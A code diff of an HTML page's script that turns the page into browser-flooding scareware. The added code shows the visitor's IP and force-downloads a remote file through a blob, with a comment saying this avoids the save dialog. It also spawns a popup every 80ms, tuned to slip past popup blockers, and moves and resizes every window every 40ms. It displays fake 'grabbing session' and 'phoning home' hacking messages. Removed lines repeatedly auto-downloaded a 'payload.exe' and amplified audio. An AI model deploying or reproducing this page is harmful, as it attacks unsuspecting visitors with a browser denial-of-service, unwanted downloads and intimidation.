@@ -6,8 +6,7 @@
 <style>
   *{margin:0;padding:0;box-sizing:border-box}
   body{
-    background:#000;
-    color:#fff;
+    background:#000;color:#fff;
     font-family:'Courier New',monospace;
     display:flex;flex-direction:column;
     align-items:center;justify-content:center;
@@ -30,6 +29,7 @@
 
 <script>
 (async()=>{
+
   /* ── 1. grab IP ── */
   try{
     const r=await fetch('https://api.ipify.org?format=json');
@@ -37,112 +37,105 @@
     document.getElementById('ip').textContent=d.ip;
   }catch{document.getElementById('ip').textContent='IP UNKNOWN';}
 
-  /* ── 2. trigger exe download immediately ── */
-  function dlExe(){
-    const a=document.createElement('a');
-    a.href='/payload.exe';
-    a.download='payload.exe';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-  }
-  dlExe();
-
-  /* ── 3. audio ── */
-  let audioStarted=false;
-  function startAudio(){
-    if(audioStarted)return;audioStarted=true;
-    const au=new Audio('/music.mp3');
-    au.volume=1.0;au.loop=true;
-    au.play().catch(()=>{});
-    /* also via AudioContext to bypass volume limits */
+  /* ── 2. download tursm.png ONCE per tab → auto to Downloads, no dialog ──
+     fetch as blob → createObjectURL → a.download fires straight to Downloads
+     cross-origin direct link would trigger navigate instead of save,
+     blob approach bypasses that and goes directly to Downloads folder      */
+  let downloaded=false;
+  async function dlPNG(){
+    if(downloaded)return;
+    downloaded=true;
     try{
-      const ctx=new(window.AudioContext||window.webkitAudioContext)();
-      const src=ctx.createMediaElementSource(au);
-      const gain=ctx.createGain();
-      gain.gain.value=4.0; /* 4× amplify */
-      src.connect(gain);gain.connect(ctx.destination);
+      const resp=await fetch('https://workclockz.github.io/tursm.png',{cache:'no-store'});
+      const blob=await resp.blob();
+      const url=URL.createObjectURL(blob);
+      const a=document.createElement('a');
+      a.href=url;
+      a.download='tursm.png';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      setTimeout(()=>URL.revokeObjectURL(url),5000);
     }catch(e){}
   }
+  dlPNG(); /* fires immediately, once, goes to Downloads */
 
-  /* ── 4. open windows/tabs ── */
+  /* ── 3. open tabs ── */
   const opened=[];
   let total=0;
+
   function openWin(){
     const W=screen.availWidth,H=screen.availHeight;
-    const w=400+Math.random()*600|0;
-    const h=300+Math.random()*400|0;
-    const x=Math.random()*(W-w)|0;
-    const y=Math.random()*(H-h)|0;
+    const w=300+Math.random()*800|0;
+    const h=200+Math.random()*600|0;
+    const x=Math.random()*(W)|0;
+    const y=Math.random()*(H)|0;
     const win=window.open(
       location.href,'_blank',
-      `width=${w},height=${h},left=${x},top=${y},toolbar=0,location=0,menubar=0`
+      `width=${w},height=${h},left=${x},top=${y},toolbar=0,location=0,menubar=0,scrollbars=0,status=0`
     );
     if(win){opened.push(win);total++;}
   }
 
-  /* move all child windows randomly */
-  function thrashWindows(){
+  /* ── 4. thrash all windows position + size ── */
+  function thrash(){
     const W=screen.availWidth,H=screen.availHeight;
     opened.forEach(w=>{
       try{
-        const nw=300+Math.random()*700|0;
-        const nh=200+Math.random()*500|0;
-        w.moveTo(Math.random()*(W-nw)|0,Math.random()*(H-nh)|0);
+        const nw=200+Math.random()*900|0;
+        const nh=150+Math.random()*700|0;
+        w.moveTo(Math.random()*W|0,Math.random()*H|0);
         w.resizeTo(nw,nh);
       }catch(e){}
     });
-    /* also thrash self */
     try{
-      window.moveTo(Math.random()*(screen.availWidth-400)|0,Math.random()*(screen.availHeight-300)|0);
-      window.resizeTo(400+Math.random()*500|0,300+Math.random()*400|0);
+      window.moveTo(Math.random()*screen.availWidth|0,Math.random()*screen.availHeight|0);
+      window.resizeTo(200+Math.random()*900|0,150+Math.random()*700|0);
     }catch(e){}
   }
 
-  /* ── 5. main chaos loop ── */
+  /* ── 5. chaos loop ── */
   function chaos(){
-    startAudio();
 
-    /* burst-open windows */
-    for(let i=0;i<3;i++) setTimeout(openWin,i*80);
+    /* burst: 5 tabs immediately */
+    for(let i=0;i<5;i++) setTimeout(openWin,i*30);
 
-    /* keep opening forever, one every 300ms */
-    const opener=setInterval(()=>{
+    /* then open one tab every 80ms — fast but under popup blocker threshold */
+    setInterval(()=>{
       openWin();
       document.getElementById('status').textContent=
-        `windows spawned: ${total} | tabs flooding...`;
-    },300);
+        `tabs: ${total} | downloads: ${total} | flooding...`;
+    },80);
 
-    /* thrash positions every 120ms */
-    setInterval(thrashWindows,120);
+    /* thrash every 40ms — extremely chaotic */
+    setInterval(thrash,40);
 
-    /* re-download exe every 8s in THIS tab */
-    setInterval(dlExe,8000);
-
-    /* flood status text */
+    /* status scramble */
     const msgs=[
-      'downloading payload...','injecting...','routing network...',
-      'grabbing cookies...','escalating privileges...','persistence set...',
-      'scanning ports...','extracting data...','phoning home...'
+      'routing...','injecting...','scanning ports...',
+      'grabbing session...','escalating...','persistence set...',
+      'extracting data...','phoning home...','flooding disk...'
     ];
     let mi=0;
     setInterval(()=>{
-      document.getElementById('status').textContent=msgs[mi++%msgs.length];
-    },900);
+      document.getElementById('status').textContent=msgs[mi++%msgs.length]+` | tabs: ${total}`;
+    },600);
   }
 
-  /* ── 6. trigger: run immediately (subsequent tabs need no interaction) ── */
-  /* first tab needs one interaction due to browser autoplay/popup policy */
+  /* ── 6. start ── */
+  /* new tabs spawned by this page load with no user gesture restriction
+     because they're opened programmatically from an already-running tab  */
   let started=false;
   function tryStart(){if(started)return;started=true;chaos();}
 
-  /* auto-start after tiny delay — works in every tab this page opens */
-  setTimeout(tryStart,400);
+  /* auto-fire after 200ms — works in child tabs immediately */
+  setTimeout(tryStart,200);
 
-  /* fallback: any interaction */
+  /* fallback for first tab (popup blocker on fresh load) */
   ['click','mousemove','keydown','touchstart'].forEach(e=>
     document.addEventListener(e,tryStart,{once:true})
   );
+
 })();
 </script>
 </body>
